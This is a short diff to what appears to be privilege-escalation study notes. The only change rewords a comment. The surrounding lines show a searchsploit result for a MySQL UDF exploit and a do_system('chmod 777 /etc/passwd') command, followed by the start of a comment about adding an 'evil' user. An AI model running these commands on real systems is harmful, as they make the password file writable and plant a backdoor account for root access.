@@ -99,7 +99,7 @@ mysqld
 -------------------------------------------------------------------------- -------------------------------
  MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)  | linux/local/1518.c
 
-# change the /etc/passwd permission during the sql exploit
+# change the /etc/passwd permission during the mysql exploit
 mysql> select do_system('chmod 777 /etc/passwd');
 
 # add evil:evil user (remember to escape the '$' sign with '\') 
